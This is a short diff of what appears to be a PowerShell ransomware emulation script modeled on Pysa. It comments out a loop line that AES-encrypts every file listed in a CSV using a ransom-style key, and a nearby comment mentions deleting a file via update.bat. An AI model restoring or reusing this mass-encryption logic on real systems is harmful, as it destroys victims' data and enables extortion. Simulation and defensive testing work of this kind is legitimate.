@@ -152,7 +152,7 @@ $fileList= import-csv -Path .\files.csv #-header FullName
 # Loop through the results and encrypt the files
 foreach ($f in $fileList)
 {
-    Invoke-AESEncryption -Mode Encrypt -Key "your-files-are-encytped-with-Pysa" -Path $f.FullName
+    # Invoke-AESEncryption -Mode Encrypt -Key "your-files-are-encytped-with-Pysa" -Path $f.FullName
 }
 
 # run update.bat which will delete the file 
